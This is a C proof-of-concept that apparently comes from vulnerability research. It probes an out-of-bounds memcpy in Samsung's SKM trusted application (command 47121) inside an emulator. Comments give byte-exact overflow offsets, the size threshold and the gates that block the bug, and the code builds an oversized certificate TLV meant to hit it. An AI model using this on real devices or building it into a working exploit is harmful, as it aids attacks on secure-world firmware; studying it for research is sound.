// SKM-4 dynamic reachability probe — cmd 47121 (skm_installCertificate).
// Drives the SHIPPING S921BXXSFDZE1 SKM binary in TA_GP_emulator
// (staged .ta == shipping .elf, sha 0d2a7adf…).
//
// Bug (byte-exact, see verify_primitive.py): skm_installCertificate builds a
// SecureObject on an 8189-B stack buffer secobj_body=&s+3 and appends the
// in-flight CSR key blob at the NW-controlled offset cert_size+3 with NO
// capacity re-check:
//     memcpy(secobj_body, cert_der, cert_size)               (1) fits (cert_size<=8186)
//     memcpy(secobj_body+cert_size+3, csr_blob, blob_len)    (2) OOB when cert_size>6886
// cert_size = the tag-27 TLV length (NW-controlled), capped by req_len<=0x2000.
//
// This probe sends cert_size=8000 (> the 6886 overflow threshold).  The OOB is
// REACHABLE only after three crypto/state gates inside the handler:
//   G0  skm_csr_pending_len != 0   (a prior cmd 47120 CSR must be in-flight)
//   G1  skm_verifyCertificateWithCA (genuine Samsung-CA-signed DRK cert)
//   G2/G3 validateDrkCert + key-consistency
// We have no in-flight CSR and no genuine CA cert, so the natural drive bails at
// G0 with -12001 ("Generating CSR should be executed before…") — proving the
// handler is dynamically reachable and cert_size is plumbed through, while the
// OOB memcpy@0x17ff4 is NOT reached (gated).  TAEMU_TRACE_ADDR confirms which
// addresses execute.  The OOB geometry itself is settled byte-exact statically
// (verify_primitive.py 33/33) — it lands in dead parsed_cert, no crash possible.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

#define BUF_SZ      0x2010          /* >= 8 head + 0x2000 payload */
#define CMD_INSTALL 47121           /* 0xB811 */

/* cert_size > 6886 => the second memcpy would overflow IF the gates passed. */
#ifndef CERT_SIZE
#define CERT_SIZE   8000
#endif

void send_install(TEEC_Session *session)
{
    unsigned char *req = malloc(BUF_SZ);
    memset(req, 0, BUF_SZ);

    unsigned cert_size = CERT_SIZE;
    unsigned total_len = 3 + cert_size;          /* one tag-27 record */
    unsigned payload_len = 6 + cert_size;        /* 0xFE + u16 + (tag+u16+value) */

    /* request head */
    *(unsigned int*)(req + 0) = CMD_INSTALL;
    *(unsigned int*)(req + 4) = payload_len;     /* req_len (<=0x2000) */
    /* payload = Samsung TLV */
    unsigned char *p = req + 8;
    p[0] = 0xFE;                                  /* sentinel */
    p[1] = total_len & 0xff;                      /* total_len u16 LE */
    p[2] = (total_len >> 8) & 0xff;
    p[3] = 27;                                    /* tag 27 (cert) */
    p[4] = cert_size & 0xff;                      /* rec len u16 LE */
    p[5] = (cert_size >> 8) & 0xff;
    memset(p + 6, 0x41, cert_size);               /* cert value ('A'…) */

    unsigned req_total = 8 + payload_len;         /* bytes actually used */
    printf("[poc] cmd 47121: cert_size=%u (>6886 => OOB if gates passed), "
           "payload_len=%u, req_total=%u\n", cert_size, payload_len, req_total);

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_NONE,
                                     TEEC_NONE, TEEC_NONE);   /* low nibble == 7 */
    op.params[0].tmpref.buffer = req;
    op.params[0].tmpref.size   = req_total;
    uint32_t origin = 0;

    printf("[poc] InvokeCommand cmd=47121 paramTypes=0x%lx\n", (unsigned long)op.paramTypes);
    TEEC_Result res = TEEC_InvokeCommand_impl(session, CMD_INSTALL, &op, &origin);
    printf("[poc] cmd 47121 returned res=0x%x origin=0x%x  "
           "(-12001=0xFFFFD11F CSR-not-in-flight gate; -12007=CA-verify gate)\n", res, origin);
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-000000534b4d";
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;

    load_functions();
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                               NULL, NULL, &origin);
    if (res != TEEC_SUCCESS) { printf("OpenSession failed 0x%x origin 0x%x\n", res, origin);
        TEEC_FinalizeContext_impl(&context); exit(-1); }

    send_install(&session);
    printf("[+] done\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
